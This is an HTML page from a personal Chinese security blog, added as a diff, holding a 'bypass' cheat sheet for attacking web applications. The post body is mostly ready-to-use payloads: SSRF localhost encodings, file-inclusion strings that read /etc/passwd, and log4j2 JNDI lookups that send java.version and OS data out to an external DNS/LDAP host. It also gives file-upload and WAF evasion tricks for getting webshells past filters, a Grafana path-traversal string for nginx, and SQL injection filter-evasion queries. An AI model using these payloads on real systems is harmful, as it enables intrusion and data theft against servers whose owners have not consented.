@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="开这一篇主要是因为开始认识到知识整理的重要性，因为不可能时刻都记得所有的bypass点，所以当看到有用的bypass的tips的时候希望能记录，整理，随时更新到这一篇当中来。 敏感目录&#x2F;文件访问专题 对敏感目录访问有时直接访问不成功，可以在目录&#x2F;文件后面加上 .json 针对tp的log文件，有时直接访问.log会失败，这里可以在.log后面再加上一个.来绕过。形如 .log.  SSRF专题 针">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypass大杂烩">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2022&#x2F;02&#x2F;17&#x2F;bypass%E5%A4%A7%E6%9D%82%E7%83%A9&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="开这一篇主要是因为开始认识到知识整理的重要性，因为不可能时刻都记得所有的bypass点，所以当看到有用的bypass的tips的时候希望能记录，整理，随时更新到这一篇当中来。 敏感目录&#x2F;文件访问专题 对敏感目录访问有时直接访问不成功，可以在目录&#x2F;文件后面加上 .json 针对tp的log文件，有时直接访问.log会失败，这里可以在.log后面再加上一个.来绕过。形如 .log.  SSRF专题 针">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;02&#x2F;17&#x2F;V56j3K7vDEqBYnF.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;02&#x2F;17&#x2F;SUIhx9mRunD1wbk.png">
+<meta property="og:updated_time" content="2022-02-18T08:59:02.785Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;02&#x2F;17&#x2F;V56j3K7vDEqBYnF.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/02/17/bypass大杂烩/"/>
+
+
+
+
+
+  <title>bypass大杂烩 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/17/bypass%E5%A4%A7%E6%9D%82%E7%83%A9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bypass大杂烩</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-17T09:21:28+08:00">
+                2022-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>开这一篇主要是因为开始认识到知识整理的重要性，因为不可能时刻都记得所有的bypass点，所以当看到有用的bypass的tips的时候希望能记录，整理，随时更新到这一篇当中来。</p>
+<h1 id="敏感目录-文件访问专题"><a href="#敏感目录-文件访问专题" class="headerlink" title="敏感目录/文件访问专题"></a>敏感目录/文件访问专题</h1><ul>
+<li>对敏感目录访问有时直接访问不成功，可以在目录/文件后面加上 .json</li>
+<li>针对tp的log文件，有时直接访问.log会失败，这里可以在.log后面再加上一个.来绕过。形如 .log.</li>
+</ul>
+<h1 id="SSRF专题"><a href="#SSRF专题" class="headerlink" title="SSRF专题"></a>SSRF专题</h1><ul>
+<li>针对127.0.0.1，有如下多种变式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.1</span><br><span class="line">http://127.1</span><br><span class="line">http://0.0.0.0</span><br><span class="line">http://0</span><br><span class="line">http://0x7f000001</span><br><span class="line">http://2130706433</span><br><span class="line">http://017700000001</span><br><span class="line">http://[::]:80</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="文件包含专题"><a href="#文件包含专题" class="headerlink" title="文件包含专题"></a>文件包含专题</h1><p>对于文件包含可以使用如下的一些变形来绕过检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file:/etc/passwd?/</span><br><span class="line">file:/etc/passwd%3F/</span><br><span class="line">file:/etc%252Fpasswd/</span><br><span class="line">file:/etc%252Fpasswd%3F/</span><br><span class="line">file:///etc/?/../passwd</span><br><span class="line">file:///etc/%3F/../passwd</span><br><span class="line">file:$&#123;br&#125;/et$&#123;u&#125;c/pas$&#123;te&#125;swd?/</span><br><span class="line">file:$(br)/et$(u)c/pas$(te)swd?/</span><br></pre></td></tr></table></figure>
+
+<h1 id="log4j2专题"><a href="#log4j2专题" class="headerlink" title="log4j2专题"></a>log4j2专题</h1><p>探测用poc <code>${jndi:ldap://xxxxx.dnslog.cn/exp}</code><br> 由于log4j2可以支持协议嵌套，所以利用log4j2就算版本不合适本地没有gadget也可以外带一些信息</p>
+<ul>
+<li><p><code>${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}</code></p>
+</li>
+<li><p><code>${jndi:ldap://${sys:java.version}.7fc8ba44.dns.1433.eu.org/aa}</code></p>
+</li>
+<li><p><code>${jndi:ldap://${env:os}.7fc8ba44.dns.1433.eu.org/aa}</code>    windows<br>具体有什么属性可以外带，可以参考 <a href="https://devdocs.io/openjdk~11/java.base/java/lang/system#getProperties()" target="_blank" rel="noopener">https://devdocs.io/openjdk~11/java.base/java/lang/system#getProperties()</a></p>
+</li>
+<li><p>同时可以利用dns外带信息<br>浅蓝大佬编写的一些log4j2利用方式 <a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p>
+<h1 id="文件上传专题"><a href="#文件上传专题" class="headerlink" title="文件上传专题"></a>文件上传专题</h1><p>这里主要分两部分，一个是waf限制导致上传失败，另一个是由于代码本身黑名单限制而导致的上传失败<br>如果是waf限制，通常会有waf拦截页面，或者请求多次被重置reset无响应包。如果是后缀名黑名单通常返回包带有文件格式不允许字样</p>
+</li>
+</ul>
+<h2 id="针对后缀黑名单的绕过"><a href="#针对后缀黑名单的绕过" class="headerlink" title="针对后缀黑名单的绕过"></a>针对后缀黑名单的绕过</h2><h3 id="别名代替"><a href="#别名代替" class="headerlink" title="别名代替"></a>别名代替</h3><ul>
+<li><p>asp/cer/asa/cdx</p>
+</li>
+<li><p>aspx/ashx/asmx/svc/cshtml/vbhtml(.net4.0支持Razor)</p>
+</li>
+<li><p>jsp/jspx</p>
+</li>
+<li><p>php/php3/php4/php5/php7/pht/phtml/phps</p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3></li>
+<li><p>大小写不敏感 文件后缀变为 <code>.PHp</code>，<code>.JSp</code></p>
+</li>
+<li><p>[空格] 文件后缀变为<code>.php[空格]</code></p>
+</li>
+<li><p>命名不允许的特殊字符 <code>?</code> <code>/</code> 文件名后加<code>?\/:*&lt;&gt;|</code>，后缀变为<code>.php?</code>,<code>.jsp/</code>之类的</p>
+</li>
+<li><p><code>::$DATA</code></p>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3></li>
+<li><p>试试 / 绕过，变为<code>1./jspx</code></p>
+<h2 id="针对waf的绕过"><a href="#针对waf的绕过" class="headerlink" title="针对waf的绕过"></a>针对waf的绕过</h2><h3 id="后缀落地"><a href="#后缀落地" class="headerlink" title="后缀落地"></a>后缀落地</h3><p>这里下面讲到的绕WAF的核心思想在于<strong>服务器能解析而WAF识别不出来</strong>。下面讨论的是文件名后缀落地部分，内容免杀部分后续看到会再更新。<br>常见的WAF有安全狗，Yxlink-WAF，云锁，玄武盾，创宇盾，WTS-WAF,qianxin-WAF，WAF2.0等。每家WAF对后缀判断的具体位置不同，这里把所有能用的有用的绕过实例做一个整理</p>
+</li>
+<li><p>超长文件名溢出（安恒玄武盾）</p>
+</li>
+<li><p>双写文件名绕过（某狗，锁）<code>filename=&quot;hasker.jsp&quot;;filename=&quot;hacker.jsp&quot;</code></p>
+</li>
+<li><p>去掉引号 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploadfile&quot;; filename=&quot;test.jsp&quot;</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadfile&quot;; filename=test.jsp</span><br></pre></td></tr></table></figure></li>
+<li><p>换行法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:</span><br><span class="line"> form-data;</span><br><span class="line"> name=&quot;file&quot;;</span><br><span class="line"> f</span><br><span class="line">i</span><br><span class="line">l</span><br><span class="line">e</span><br><span class="line">n</span><br><span class="line">a</span><br><span class="line">m</span><br><span class="line">e=</span><br><span class="line">&quot;test.php&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p>分块传输</p>
+<blockquote>
+<p>copy normal.jpg /b + shell.php /a webshell.jpg<br>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。<br>burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p>
+</blockquote>
+<h3 id="shell访问"><a href="#shell访问" class="headerlink" title="shell访问"></a>shell访问</h3></li>
+<li><p><em>某些waf可能会阻止访问upload下的脚本文件*</em>，可以<strong>尝试</strong>在后面加<code>/.png</code>之类的绕过，类似<code>http://xxx.xx/upload/shell.php/.png</code>，<code>http://xx.xx/upload/a.png/../shell.php</code></p>
+<h3 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h3></li>
+<li><p>大文件，脏数据</p>
+</li>
+<li><p>免杀shell。可以利用特性构造，比如php对base64的可容性很高，在里面加东西可以过waf，但是php能正常解析。这里还是那个核心思想-waf识别不出，但服务器能正常解析。</p>
+<h2 id="对字段动手干扰WAF"><a href="#对字段动手干扰WAF" class="headerlink" title="对字段动手干扰WAF"></a>对字段动手干扰WAF</h2><h3 id="Content-Tye"><a href="#Content-Tye" class="headerlink" title="Content-Tye"></a>Content-Tye</h3><p>常见的Content-Type如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Type: multipart/form-data</span><br></pre></td></tr></table></figure>
+<p>有时候会在后面加上编码，变成类似这样<code>Content-Type: text/xml;charset=utf-8</code>。<strong>这个header允许大小写</strong>，还允许分号分割后增加脏数据干扰waf识别。一般来说Content-Type声明和POST传输的数据格式需要对应，不过有时候不对应或者没有Content-Type也不影响。<br><code>Content-TYpe: application/octet-stream; afsdfasdf</code></p>
+<h3 id="Content-Disposition"><a href="#Content-Disposition" class="headerlink" title="Content-Disposition"></a>Content-Disposition</h3><p>Content-Disposition: form-data;通常用于文件上传，也可以用于传参，除了上面说的Content-Type段，还可以在Content-Disposition，boundary段动手脚。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;</span><br><span class="line">n</span><br><span class="line">a</span><br><span class="line">m</span><br><span class="line">e</span><br><span class="line">=</span><br><span class="line">=</span><br><span class="line">=&quot;file&quot;; filename=&quot;test.php &quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/02/17/V56j3K7vDEqBYnF.png" alt="1.png"></p>
+<h3 id="增加Expect-100-continue-header头"><a href="#增加Expect-100-continue-header头" class="headerlink" title="增加Expect: 100-continue header头"></a>增加Expect: 100-continue header头</h3><p>有的waf会检测返回包，这个header让返回包增加一个100状态码，所有中间件都支持<br><img src="https://s2.loli.net/2022/02/17/SUIhx9mRunD1wbk.png" alt="1.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/4KdbZ71NgjJ0JfRPfROHVA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4KdbZ71NgjJ0JfRPfROHVA</a><br><a href="https://mp.weixin.qq.com/s/UbqPcqPnQ3GNKSIx0VNjxw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/UbqPcqPnQ3GNKSIx0VNjxw</a></p>
+</li>
+</ul>
+<h1 id="nginx场景绕过"><a href="#nginx场景绕过" class="headerlink" title="nginx场景绕过"></a>nginx场景绕过</h1><ul>
+<li>在url中加上/#/能让nginx不处理锚点之后的内容，利用来处理某些nginx反代的目录穿越问题。比如前段时间的grafana。遇到nginx反代可以利用如下poc绕过，然后进行利用<br><code>/public/plugins/alertlist/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/hosts</code><br>这里插入锚点使得nginx忽略#后面的内容，而后又用/../吞掉锚点，正常进行目录穿越</li>
+<li>weblogic中，访问路径命中nginx规则时，可以考虑如下绕过：<code>http://127.0.0.1/console/login/LoginForm.jsp;/../../../</code><br>规则<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location /console/ &#123;</span><br><span class="line"></span><br><span class="line">deny all;</span><br><span class="line"></span><br><span class="line">return 403;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+对nginx来说，接收到的请求是<code>http://127.0.0.1</code>,而对weblogic来说，接收到的是<code>http://127.0.0.1/console/login/LoginForm.jsp</code></li>
+<li><em>并且*</em><br>Nginx 的 proxy_pass 配置一般如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line"> proxy_pass xxxx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+xxx 部分是要转发的后端，如果 xxx 以斜杠（/）结尾 ，则请求会经过处理（normailized）再转发，而如果 xxx 没有以斜杠（/）结尾，则完整的原始请求会被转发到后端<h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><a href="https://articles.zsxq.com/id_whpewmqqocrw.html" target="_blank" rel="noopener">https://articles.zsxq.com/id_whpewmqqocrw.html</a><br><a href="https://articles.zsxq.com/id_jb6bwow4zf5p.html" target="_blank" rel="noopener">https://articles.zsxq.com/id_jb6bwow4zf5p.html</a><br><a href="https://articles.zsxq.com/id_whg6hb68xkbd.html" target="_blank" rel="noopener">https://articles.zsxq.com/id_whg6hb68xkbd.html</a></li>
+</ul>
+<h1 id="SQL注入专题"><a href="#SQL注入专题" class="headerlink" title="SQL注入专题"></a>SQL注入专题</h1><p>SQL注入主要就两个方面的思想，一个是硬刚waf规则，fuzz出规则的漏洞进而利用，另一个是利用 计算机语言/中间件/操作系统 等和waf的解析差异，构造畸形请求来绕过waf检测</p>
+<h2 id="通用的waf绕过方法"><a href="#通用的waf绕过方法" class="headerlink" title="通用的waf绕过方法"></a>通用的waf绕过方法</h2><ul>
+<li>大小写绕过 <code>Union seLect</code> 主要针对垃圾规则</li>
+<li>双写绕过 <code>seselectlect</code> 主要针对关键字过滤不完全</li>
+<li>内联注释绕过 <code>and /*!select*/ 1,2</code> MYSQL特性，包裹在<code>/!**/</code>中的部分会被作为sql语句的一部分被执行</li>
+<li>编码绕过 16进制编码;unicode编码对部分符号的绕过：单引号 –&gt; <code>%u0037</code>,<code>%u02b9</code>;空格 –&gt; <code>%u0020</code>,<code>%uff00</code>;左括号 –&gt; <code>%u0028</code>,<code>%uff08</code>;右括号 –&gt; <code>%u0029</code>,<code>%uff09</code><h2 id="等价代替"><a href="#等价代替" class="headerlink" title="等价代替"></a>等价代替</h2>对于某些关键字或者符号/函数被过滤，可以使用它的等价代替品来实现waf的绕过<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3></li>
+<li>注释符代替(/**/)</li>
+<li><code>()</code>绕过</li>
+<li>``绕过</li>
+<li>空白符代替 mysql <code>%09%0A%0B%0C%0D%20</code>,mssql <code>%00-%20</code>, oracle <code>%00%09%0A%0B%0C%0D%20</code></li>
+</ul>
+<h3 id="if过滤"><a href="#if过滤" class="headerlink" title="if过滤"></a>if过滤</h3><ul>
+<li>对if的过滤，可以使用case when来代替<h3 id="mid过滤"><a href="#mid过滤" class="headerlink" title="mid过滤"></a>mid过滤</h3></li>
+<li>对mid的过滤，可以用substr，right/left配合reverse来读取。</li>
+<li>replace(LPAD(user(),2,1),LPAD(user(),2-1,1),””); 这里LPAD是左填充，LPAD(str,len,padstr)。从str截取len的长度，如果len比str长，那么用padstr填充，如果len小于等于str，那么就截取对应长度。REPLACE(str,from_str,to_str)，在str中搜索from_str,替换成to_str。所以原来的payload的意思就是截取两个长度的user()作为str，截取一个长度作为from_str并将它替换为空。举例 user–&gt;root,str–&gt;ro,form_str–&gt;r;替换后得到o.遍历字符串时将第一个LPAD的len从1开始，而第二个LPAD的len始终比第一个LPAD的len小1即可。</li>
+<li>LPAD(REVERSE(TRIM( lpad(user(),length,SPACE(1)) )),1,SPACE(1)；TRIM就是去掉左右空格，SPACE(len)就是返回指定长度的空格。这里就是从user()中截取length个长度，然后去掉它的左右空格(如果有)，然后将从user()截取的数据翻转，再次用LPAD截取字符串。要遍历字符串，将length从1开始增加即可。<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3></li>
+<li>limit 2,1 –&gt; limit 1 offset 2</li>
+<li>union select 1,2,3 –&gt; union select * from (select 1)a join (select 2)b join (select 3)c</li>
+<li>mid(user(),1,1) –&gt; mid(user() from 1 for 1);<h3 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h3></li>
+<li>1=1 -&gt; 1 like 1;</li>
+<li>1 rlike 1;</li>
+<li>1 and 1 regexp 1(mysql);</li>
+<li><code>&lt;&gt;</code>等价于 <code>!=</code> 所以 1 or !(1&lt;&gt;1);</li>
+<li>1 and 1 bwtween 1 and 1;</li>
+<li>select if(abs(strcmp((ascii(mid(user()from(1)for(2)))),114))-1,sleep(5),0) 这里要用绝对值，因为小于的时候会返回-1，等于返回0，大于返回1;</li>
+<li>find_in_set(ord(mid(user() from 1 for 1)),114);find_in_set(str,strlist)，在strlist中搜索str，搜索到就返回对应的索引下标，找不到返回0.这里可以利用返回值来确定是否相等<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select find_in_set(ord(mid(user() from 1 for 1)),&apos;111,112,113,114&apos;);</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">| find_in_set(ord(mid(user() from 1 for 1)),&apos;111,112,113,114&apos;) |</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">|                                                            4 |</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select find_in_set(ord(mid(user() from 1 for 1)),&apos;111,112,113&apos;);</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| find_in_set(ord(mid(user() from 1 for 1)),&apos;111,112,113&apos;) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">|                                                        0 |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="ascii过滤"><a href="#ascii过滤" class="headerlink" title="ascii过滤"></a>ascii过滤</h3></li>
+<li>ord,用于多字节，返回最左边一字节对应的ascii码</li>
+<li>conv(hex(c),16,10) 进制转换，将十六进制转为十进制得到相同结果<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(substr(user(),1,1));</span><br><span class="line">+---------------------------+</span><br><span class="line">| ascii(substr(user(),1,1)) |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                       114 |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ord(substr(user(),1,1));</span><br><span class="line">+-------------------------+</span><br><span class="line">| ord(substr(user(),1,1)) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                     114 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(hex(substr(user(),1,1)),16,10);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| conv(hex(substr(user(),1,1)),16,10) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 114                                 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="大于小于号过滤"><a href="#大于小于号过滤" class="headerlink" title="大于小于号过滤"></a>大于小于号过滤</h3></li>
+<li>least(ord(mid(user(),1,1)),114)</li>
+<li>greatest(ord(mid(user(),1,1)),114)<h2 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h2><a href="https://xz.aliyun.com/t/7767#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7767#toc-1</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/12/20/%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/" rel="next" title="原生反序列化利用链JDK7u21">
+                <i class="fa fa-chevron-left"></i> 原生反序列化利用链JDK7u21
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/02/19/burp%E9%85%8D%E5%90%88%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85app/" rel="prev" title="burp配合模拟器抓包app">
+                burp配合模拟器抓包app <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
